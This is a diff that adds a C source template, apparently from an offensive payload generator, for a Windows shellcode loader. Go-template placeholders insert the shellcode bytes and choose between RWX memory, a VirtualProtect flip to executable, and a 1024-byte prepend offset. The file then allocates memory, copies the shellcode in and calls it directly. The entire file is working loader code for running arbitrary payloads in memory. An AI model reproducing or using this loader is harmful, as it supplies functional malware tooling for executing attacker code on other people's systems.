@@ -1,0 +1,47 @@
+#include <windows.h>
+#include <stdio.h>
+
+DWORD WINAPI run() {
+  unsigned char shellcode[] = {{ byteArray .Shellcode }};
+  {{ if .Prepend }}
+  SIZE_T shellcode_len = {{ len .Shellcode | add 1024 }};
+  {{ else }}
+  SIZE_T shellcode_len = {{ len .Shellcode }};
+  {{ end }}
+
+  {{ if .RWX }}
+  LPVOID dest = VirtualAlloc(NULL, shellcode_len, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  {{ else }}
+  LPVOID dest = VirtualAlloc(NULL, shellcode_len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
+  {{ end }}
+  if (dest == NULL)
+  {
+    return 0;
+  }
+
+  {{ if .Prepend }}
+  memcpy(dest + 1024, shellcode, shellcode_len - 1024);
+  {{ else }}
+  memcpy(dest, shellcode, shellcode_len);
+  {{ end }}
+
+  {{ if not .RWX }}
+  DWORD oldProtect = 0;
+  VirtualProtect(dest, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);
+  {{ end }}
+
+  void (*function)();
+  {{ if .Prepend }}
+  function = (void (*)())(dest + 1024);
+  {{ else }}
+  function = (void (*)())dest;
+  {{ end }}
+  function();
+
+  return 0;
+}
+
+int main() {
+  run();
+  return 0;
+}
